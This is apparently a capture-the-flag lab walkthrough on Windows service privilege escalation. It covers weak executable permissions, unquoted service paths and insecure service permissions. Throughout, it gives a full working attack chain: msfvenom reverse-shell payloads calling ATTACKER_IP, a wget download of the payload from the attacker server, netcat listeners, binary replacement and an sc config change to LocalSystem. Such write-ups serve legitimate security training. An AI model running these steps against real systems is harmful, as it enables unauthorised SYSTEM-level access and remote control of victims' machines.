
### **Overview:**

The article discusses how **Windows services** can be exploited for **privilege escalation**. The key concepts involve:

- Misconfigured **service executables** (e.g., weak file permissions).
    
- **Unquoted service paths** (where the service's executable path is not properly quoted, which leads to potential exploitation).
    
- **Insecure service permissions** (where users can change the configuration of a service to execute arbitrary commands).
    

### **Key Concepts and Steps:**

---

### **1. Querying a Service Configuration**

We start by inspecting the configuration of a Windows service using the `sc qc` command. This helps us understand which executable is associated with the service and which account the service runs under.

For example, when running:

```cmd
sc qc apphostsvc
```

We see that the **apphostsvc** service is using the `svchost.exe` executable to run with the **LocalSystem** account.

- **Binary Path Name**: The path to the executable that will run when the service starts (e.g., `C:\Windows\system32\svchost.exe -k apphost`).
    
- **Service Start Name**: The account under which the service runs (e.g., `localSystem`).
    
---
### Step-by-Step Breakdown:

1. **Open Command Prompt as Administrator:** You need elevated privileges to run this command. Open a command prompt with administrative rights.
    
2. **Run the Command:** In the command prompt, type the following command and hit Enter:
    
    ```bash
    sc qc WindowsScheduler
    ```
    
3. **Output Explanation:**
    
    When you run `sc qc WindowsScheduler`, it queries the configuration of the "WindowsScheduler" service. The output will provide details about the service, like its executable path, start type, and the account it runs under.
    
    Here is an example of the output:
    
    ```bash
    [SC] QueryServiceConfig SUCCESS
    
    SERVICE_NAME: WindowsScheduler
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 0   IGNORE
            BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : System Scheduler Service
            DEPENDENCIES       :
            SERVICE_START_NAME : .\svcuser1
    ```
    

### Explanation of Each Field:

- **SERVICE_NAME**: This is the name of the service you queried, which is "WindowsScheduler" in this case.
    
- **TYPE**: This indicates how the service interacts with the system. `10` means it's a "Win32 Own Process," meaning the service runs in its own process, separate from others.
    
- **START_TYPE**: This is the start type of the service:
    
    - `2` means **AUTO_START**, which indicates the service starts automatically when the system boots up.
        
- **ERROR_CONTROL**: This specifies what the system should do if the service fails. `0` means **IGNORE**, which means the system won't take any special action if the service fails.
    
- **BINARY_PATH_NAME**: This shows the path to the executable that runs when the service starts. In this case, it's `C:\PROGRA~2\SYSTEM~1\WService.exe`.
    
- **LOAD_ORDER_GROUP**: This indicates if the service has any dependencies or should be started in a specific order. This field is empty in this case.
    
- **TAG**: A tag used to identify the service. It's set to `0` here.
    
- **DISPLAY_NAME**: The name of the service displayed in Windows Services. In this case, it’s "System Scheduler Service."
    
- **DEPENDENCIES**: Any other services that must be running before this one starts. This field is empty here, meaning no dependencies are specified.
    
- **SERVICE_START_NAME**: The account under which the service runs. In this case, it's configured to run as `.\svcuser1`, which means it runs under the `svcuser1` account.
    

---
### **2. Weak Permissions on Service Executables**

If a service has weak file permissions, it may allow an attacker to replace the executable with a malicious payload. This happens when the file permissions (DACL) allow users to **modify** the executable file.

Example:

```cmd
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

Here, the **Everyone** group has **Modify** permissions on the executable. This means anyone (including unprivileged users) can replace the `WService.exe` with their own malicious executable.

### **3. Creating and Transferring the Payload**

Using **msfvenom** (from Metasploit), we can generate a **reverse shell payload** (a malicious executable that connects back to an attacker machine). This allows us to gain control of the target machine when executed.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

This generates a payload that, when executed, will open a reverse shell back to the attacker's machine (`LHOST=ATTACKER_IP` and `LPORT=4445`).

Then, we use a simple Python web server to serve the payload:

```bash
python3 -m http.server
```


---

### 📥 Download Payload via PowerShell

First, **download** the malicious payload (`rev-svc.exe`) onto the Windows server using **PowerShell**:

```powershell
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

- Replace `ATTACKER_IP` with your attacker's machine IP address.
    
- This command downloads the file from your attacker's web server (Python HTTP server) and saves it as `rev-svc.exe`.
    

---
### **4. Replacing the Executable**

Once the payload is on the target machine (downloaded via `wget` or another method), we move it to the location where the vulnerable service executable resides.

```cmd
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```


We replace the original service executable with our malicious payload.

Finally, we grant full permissions to the **Everyone** group to ensure the payload can be executed:

```cmd
icacls WService.exe /grant Everyone:F
```

### **5. Restarting the Service**

Next, we restart the vulnerable service. This triggers the execution of our malicious payload (since we replaced the executable with our reverse shell).

```cmd
sc stop windowsscheduler
sc start windowsscheduler
```

As a result, the service will execute the **reverse shell**, connecting back to the attacker's machine.

### **6. Getting the Reverse Shell**

Once the service restarts, the attacker's listener (`nc -lvp 4445`) will catch the reverse shell connection, and the attacker can execute commands with the privileges of the service's user (`svcuser1`).

```bash
nc -lvp 4445
```

At this point, the attacker has access to the target machine as `svcuser1` and can navigate to the desktop to retrieve flags.

---

### **Unquoted Service Paths Vulnerability**

If the path to a service’s executable isn’t properly quoted, an attacker can exploit it. This happens when the executable path contains spaces but isn’t enclosed in quotes.

Example:

```cmd
sc qc "disk sorter enterprise"
```

If the executable path is **unquoted**, the Service Control Manager (SCM) could misinterpret the command and try to execute unintended binaries.

For example:

- If the SCM encounters `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` without quotes, it might incorrectly try to execute `C:\MyPrograms\Disk.exe` or `C:\MyPrograms\Disk Sorter.exe` (due to the space).
    
- If these files don’t exist, the SCM might execute the final binary (`disksrs.exe`).
    
## **Check Permissions on the Folder**

Command:

```cmd
icacls C:\MyPrograms
```

**Result:**

- It shows **Users** can **Write (WD)** and **Add (AD)** files into `C:\MyPrograms`.
    
- **Good news for attacker!** We can create a `Disk.exe` there without needing Admin rights.
    

---

## **Create the Malicious Payload**

On your **attacker machine (Kali)**, create a **reverse shell** payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
```

**Meaning:**

- `-p windows/x64/shell_reverse_tcp` → Payload type: a shell that connects back to you.
    
- `LHOST` = your attacker's IP.
    
- `LPORT` = the port you listen on.
    
- `-f exe-service` → Format the payload as a **Windows service executable**.
    
- `-o rev-svc2.exe` → Save it as `rev-svc2.exe`.
    

---

## **Start a Listener on Kali**

On your attacker machine, listen for incoming connections:

```bash
nc -lvp 4446
```

- `nc` = netcat.
    
- `-lvp 4446` = listen on port 4446 and show connections.
    

---

## **Upload the Payload to the Victim**

On the victim (Windows) machine: Move the payload you uploaded to the right spot:

```cmd
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```

Now, your fake executable `Disk.exe` is ready.

---

## **Give Permissions to the Payload**

Make sure **everyone** can execute it:

```cmd
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

✅ Full control for **Everyone**.

---

## **Restart the Service**

Now stop and start the service manually:

```cmd
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

When the service **starts again**, it will:

- Look for `Disk.exe`.
    
- **Find your fake payload**.
    
- **Execute it**, and the payload **connects back to you**!
    

---

## **Catch the Reverse Shell**

Back on your attacker machine:

You should see something like:

```
Connection received on 10.10.175.90
Microsoft Windows [Version 10.0.17763.1821]
C:\Windows\system32> whoami
wprivesc1\svcusr2
```

🎯 Success!  
You have a shell as **svcusr2**, the service account.

---
### **Insecure Service Permissions**

If the **DACL** of a service allows a user to modify the service’s configuration, they can point the service to their own executable, allowing them to execute arbitrary code as any user (e.g., SYSTEM).

Example:

```cmd
accesschk64.exe -qlc thmservice
```

If the **BUILTIN\Users** group has **SERVICE_ALL_ACCESS** permission, an attacker can modify the service configuration and point it to their malicious executable.

```cmd
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

This changes the service to run as **LocalSystem**, which has high privileges.

### **Final Exploitation**

After modifying the service to run the malicious executable, the attacker restarts the service:

```cmd
sc stop THMService
sc start THMService
```

This triggers the execution of the reverse shell, and the attacker gains SYSTEM privileges (`whoami` shows `NT AUTHORITY\SYSTEM`).

---

### **Summary**

- **Step 1**: Query the service and inspect its configuration (`sc qc`).
    
- **Step 2**: Check the file permissions of the service’s executable (`icacls`).
    
- **Step 3**: Generate a reverse shell payload using `msfvenom` and transfer it to the target.
    
- **Step 4**: Replace the service executable with the malicious payload.
    
- **Step 5**: Restart the service to trigger the payload.
    
- **Step 6**: Gain access with the privileges of the service’s account.
    
- **Unquoted Path Exploit**: Exploit a service with an unquoted path to make it run arbitrary executables.
    
- **Insecure Permissions**: Modify a service’s configuration if the DACL allows it.
    

---
